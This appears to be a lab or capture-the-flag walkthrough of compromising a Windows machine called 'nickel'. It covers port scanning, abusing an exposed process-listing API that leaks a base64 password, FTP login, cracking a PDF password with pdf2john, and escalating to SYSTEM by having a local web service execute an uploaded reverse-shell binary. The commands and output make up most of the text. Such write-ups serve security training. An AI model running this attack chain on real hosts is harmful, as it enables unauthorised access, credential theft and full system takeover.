
```
portscan.sh 192.168.239.99

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2025-07-27T11:43:59
|_Not valid after:  2026-01-26T11:43:59
|_ssl-date: 2025-07-28T11:51:14+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2025-07-28T11:50:09+00:00
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-28T11:50:13
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.10 seconds

```

<img width="478" height="371" alt="Pasted image 20250728131535" src="https://github.com/user-attachments/assets/4ee7c1da-1295-4263-8efc-2582759a8c3f" />

<img width="626" height="251" alt="Pasted image 20250728133703" src="https://github.com/user-attachments/assets/4674535d-7495-4a6c-ac5e-b49b9fd97d79" />


```
curl -i http://192.168.239.99:33333/list-running-procs
HTTP/1.1 200 OK
Content-Length: 39
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 28 Jul 2025 12:38:04 GMT

<p>Cannot "GET" /list-running-procs</p> 
```

```
curl -i http://192.168.239.99:33333/list-running-procs -X POST
HTTP/1.1 411 Length Required
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 28 Jul 2025 12:38:29 GMT
Connection: close
Content-Length: 344

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Length Required</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Length Required</h2>
<hr><p>HTTP Error 411. The request must be chunked or have a content length.</p>
</BODY></HTML>

```

```
curl -i http://192.168.239.99:33333/list-running-procs -X POST -H 'Content-Length: 0'
HTTP/1.1 200 OK
Content-Length: 2807
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 28 Jul 2025 12:39:08 GMT



name        : System Idle Process
commandline : 

name        : System
commandline : 

name        : Registry
commandline : 

name        : smss.exe
commandline : 

name        : csrss.exe
commandline : 

name        : wininit.exe
commandline : 

name        : csrss.exe
commandline : 

name        : winlogon.exe
commandline : winlogon.exe

name        : services.exe
commandline : 

name        : lsass.exe
commandline : C:\Windows\system32\lsass.exe

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : dwm.exe
commandline : "dwm.exe"

name        : Memory Compression
commandline : 

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws8089.ps1

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws33333.ps1

name        : FileZilla Server.exe
commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"

name        : sshd.exe
commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe"

name        : VGAuthService.exe
commandline : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"

name        : vm3dservice.exe
commandline : C:\Windows\system32\vm3dservice.exe

name        : vmtoolsd.exe
commandline : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

name        : vm3dservice.exe
commandline : vm3dservice.exe -n

name        : dllhost.exe
commandline : C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : msdtc.exe
commandline : C:\Windows\System32\msdtc.exe

name        : LogonUI.exe
commandline : "LogonUI.exe" /flags:0x2 /state0:0xa3956855 /state1:0x41c64e6d

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : MicrosoftEdgeUpdate.exe
commandline : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c

name        : SgrmBroker.exe
commandline : 

name        : SearchIndexer.exe
commandline : C:\Windows\system32\SearchIndexer.exe /Embedding

name        : WmiApSrv.exe
commandline : C:\Windows\system32\wbem\WmiApSrv.exe

name        : wermgr.exe
commandline : C:\Windows\system32\wermgr.exe -upload
```

```
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```

```
hURL -b Tm93aXNlU2xvb3BUaGVvcnkxMzkK

Original string       :: Tm93aXNlU2xvb3BUaGVvcnkxMzkK                        
base64 DEcoded string :: NowiseSloopTheory139
```

```
user: ariah
passowrd: NowiseSloopTheory139
```

```
ftp 192.168.239.99
Connected to 192.168.239.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.239.99:enzy): ariah
331 Password required for ariah
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58087|)
150 Opening data channel for directory listing of "/"
-r--r--r-- 1 ftp ftp          46235 Sep 01  2020 Infrastructure.pdf
226 Successfully transferred "/"
ftp> 
```
<img width="686" height="261" alt="Pasted image 20250728135001" src="https://github.com/user-attachments/assets/d33f721a-42f9-4c33-8a8b-d24e13ccbced" />

```
pdf2john Infrastructure.pdf 
Infrastructure.pdf:$pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b93038947f76796470dbb100000000000000000000000000000000*32*d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0
```

<img width="635" height="204" alt="Pasted image 20250728135445" src="https://github.com/user-attachments/assets/609ec408-a214-40b7-b503-dd8a20c53d41" />


```
Infrastructure.pdf : ariah4168
```

<img width="712" height="402" alt="Pasted image 20250728135601" src="https://github.com/user-attachments/assets/8deacb7b-27c5-4b88-a50a-94dafc48af70" />

<img width="662" height="345" alt="Pasted image 20250728135839" src="https://github.com/user-attachments/assets/e13c38a1-9c96-426f-945b-b69fdcb396ac" />

```
ariah@NICKEL C:\Users\ariah>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.


PS C:\Users\ariah> $Resp = Invoke-WebRequest 'http://nickel/?whoami' -UseBasi
cParsing

PS C:\Users\ariah> $Resp.RawContent
HTTP/1.1 200 OK
Content-Length: 118
Date: Mon, 28 Jul 2025 13:19:31 GMT
Last-Modified: Mon, 28 Jul 2025 06:19:31 GMT
Server: Powershell Webserver/1.2 on Microsoft-HTTPAPI/2.0

<!doctype html><html><body>dev-api started at 2024-08-02T13:35:17

        <pre>nt authority\system
</pre>
</body></html>
```

```
scp revshell.exe ariah@192.168.239.99:C:/users/ariah
ariah@192.168.239.99's password: 
revshell.exe                               100%  114KB 974.0KB/s   00:00    
```

```
PS C:\Users\ariah> Invoke-WebRequest 'http://nickel/?C:\users\ariah\revshell.
exe' -UseBasicParsing
```
<img width="640" height="480" alt="Pasted image 20250728142629" src="https://github.com/user-attachments/assets/19a04f11-057c-434f-9dac-d0180dd79fe6" />


